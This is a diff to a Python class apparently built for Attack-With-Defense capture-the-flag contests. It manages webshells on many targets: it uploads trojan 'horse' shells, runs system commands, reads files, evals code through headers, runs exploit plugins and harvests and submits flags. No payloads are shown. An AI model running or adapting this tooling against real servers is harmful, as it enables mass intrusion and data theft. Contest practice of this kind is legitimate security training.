@@ -2,25 +2,23 @@ from libs.Misc import Log, Config, list_rm_repeat
 from libs.Data import Targets, WebShell, Cache
 from libs.ShellRequest import ShellRequest
 from plugs.submit import submit
+import importlib
 import re
 import os
-import importlib
 
 
 class Awd:
-    """
-    AWD主类
-    """
+    """AWD主类"""
     def __init__(self):
         self.Targets = Targets()
         self.WebShell = WebShell()
         self.Cache = Cache()
         self.ShellRequest = ShellRequest()
-        self.flag = {}   # {target: flag}
+        self.flag = {}   # {target: [flag]}
         self.help()
 
     def operate_shell(self, upload_horse=None):
-        """self.operate(self, upload_horse=None)    用于操作shell和上传木马"""
+        """用于操作shell和上传木马"""
         if len(self.Targets.targets) == 0:
             return Log.error("Still have not target, use command 'add_target' to add ")
         if len(self.WebShell.shell) == 0:
@@ -52,6 +50,8 @@ class Awd:
             horse_name = input(' upload_horse>').strip()
             if os.path.exists('horse/'+horse_name+'/Horse.php'):
                 for target in self.Targets.targets:
+                    Log.blue('[*] {}:{}'.format(target['ip'], target['port']), end=' ====> ')
+                    self.ShellRequest.pre_operate(target)
                     upload_shell = self.ShellRequest.upload_horse(target, self.WebShell.shell[shell_no], horse_name)
                     if upload_shell:
                         self.WebShell.shell.append(upload_shell)
@@ -70,6 +70,8 @@ class Awd:
                 else:
                     payload = input(' system_cmd>')
                 for target in self.Targets.targets:
+                    Log.blue('[*] {}:{}'.format(target['ip'], target['port']), end=' ====> ')
+                    self.ShellRequest.pre_operate(target)
                     result = self.ShellRequest.eval_system_shell(target, self.WebShell.shell[shell_no], payload)
                     flag_flag = self.process_result(result, target, flag_flag)
             elif shell_type == 'readfile':
@@ -77,40 +79,29 @@ class Awd:
                     return Log.error("readfile must set flag format, use command 'set_flag_format' to set.")
                 file_path = input(' read_file>')
                 for target in self.Targets.targets:
+                    Log.blue('[*] {}:{}'.format(target['ip'], target['port']), end=' ====> ')
+                    self.ShellRequest.pre_operate(target)
                     result = self.ShellRequest.readfile_shell(target, self.WebShell.shell[shell_no], file_path)
                     flag_flag = self.process_result(result, target, flag_flag)
             elif shell_type == 'header':
                 eval_code = input(' eval_code>')
                 for target in self.Targets.targets:
+                    Log.blue('[*] {}:{}'.format(target['ip'], target['port']), end=' ====> ')
+                    self.ShellRequest.pre_operate(target)
                     result = self.ShellRequest.header_shell(target, self.WebShell.shell[shell_no], eval_code)
                     flag_flag = self.process_result(result, target, flag_flag)
 
             if flag_flag:
                 Cache.save_flag(self.flag)
 
-    def custom_attack(self):
-        Log.show('Input the exp name.')
-        exp_name = input(' exp_name>').strip()
-        if os.path.exists('plugs/{}.py'.format(exp_name)):
-            exp = importlib.import_module('plugs.{}'.format(exp_name))
-            flag_flag = False
-            for target in self.Targets.targets:
-                result = exp.attack(target)
-                flag_flag = self.process_result(result, target, flag_flag)
-            if flag_flag:
-                Cache.save_flag(self.flag)
-        else:
-            Log.error("Your input exp not exists.")
-
     def show_flag(self):
         has_flag = False
         for flag in self.flag.values():
             if flag:
+                Log.green(flag)
                 has_flag = True
         if not has_flag:
             return Log.error("Have not get flag.")
-        for flag in self.flag.values():
-            Log.green(flag)
 
     def del_webshell(self):
         if len(self.WebShell.shell) == 0:
@@ -133,15 +124,63 @@ class Awd:
 
     def submit_flag(self):
         has_flag = False
-        for flag in self.flag.values():
-            if flag:
+        for flags in self.flag.values():
+            if flags:
                 has_flag = True
         if not has_flag:
             return Log.error("Have not get flag.")
         try:
             submit(self.flag)
-        except:
-            Log.error('Submit error.')
+        except Exception as e:
+            Log.error('Submit error. {}'.format(e))
+
+    def custom_attack(self):
+        """自定义攻击"""
+        Log.show('Input the exp name.')
+        exp_name = input(' exp_name>').strip()
+        if os.path.exists('plugs/{}.py'.format(exp_name)):
+            exp = importlib.import_module('plugs.{}'.format(exp_name))
+            flag_flag = False
+            for target in self.Targets.targets:
+                ip, port = target['ip'], target['port']
+                Log.blue('[*] {}:{}'.format(ip, port), end=' ====> ')
+                try:
+                    result = exp.attack(ip, port)
+                    flag_flag = self.process_result(result, target, flag_flag)
+                except Exception as e:
+                    return Log.red('attack error. {}'.format(e))
+            if flag_flag:
+                Cache.save_flag(self.flag)
+        else:
+            Log.error("Your input exp not exists.")
+
+    def custom_request(self):
+        """自定义发起请求"""
+        path, method, data = None, None, None
+        Log.show('Input request path')
+        Log.eg('/path/index.php?arg1=value1&arg2=value2')
+        path = input(' path>').strip()
+
+        while True:
+            method = input(' method>').strip().upper()
+            if method == 'EXIT':
+                return
+            if method == 'GET' or method == 'POST':
+                break
+            Log.error('Only support GET/POST method. Input "exit" to terminal.')
+        if method == 'POST':
+            data = input(' data>')
+
+        flag_flag = False
+        for target in self.Targets.targets:
+            Log.blue('[*] {}:{}'.format(target['ip'], target['port']), end=' ====> ')
+            try:
+                result = self.ShellRequest.make_request(target, method, path, data)
+                flag_flag = self.process_result(result, target, flag_flag)
+            except Exception as e:
+                Log.red('request error. {}'.format(e))
+        if flag_flag:
+            Cache.save_flag(self.flag)
 
     @staticmethod
     def help():
@@ -162,22 +201,24 @@ class Awd:
         Log.show('  \033[36mshow_flag      \033[0m  Show the flag.')
         Log.show('  \033[36mupload_horse   \033[0m  Upload a horse to target server.')
         Log.show('  \033[36msubmit_flag    \033[0m  Submit the flags(need rewrite the plugs/submit.py)')
-        Log.show('  \033[36mcustom_attack  \033[0m  Custom attack.\n')
+        Log.show('  \033[36mcustom_attack  \033[0m  Custom attack.')
+        Log.show('  \033[36mcustom_request \033[0m  Make a request.\n')
 
     def process_result(self, result, target, flag_flag):
         """从字符串中获取flag并显示，如果设置了flag_format才保存flag"""
         if result:
             if Config.flag_format:
                 flag = re.findall(Config.flag_format, result)
+                flag = list_rm_repeat(flag)
                 if flag:
                     flag_flag = True
-                    flag = ''.join(flag)
                     self.flag[target['ip'] + ':' + target['port']] = flag
                     Log.show(flag)
                 else:
-                    self.flag[target['ip'] + ':' + target['port']] = ''
+                    self.flag[target['ip'] + ':' + target['port']] = []
                     Log.show('Request ok but not get flag.')
             else:
                 Log.show(result)
+        elif result == '':
+            Log.show('not have result.')
         return flag_flag
-
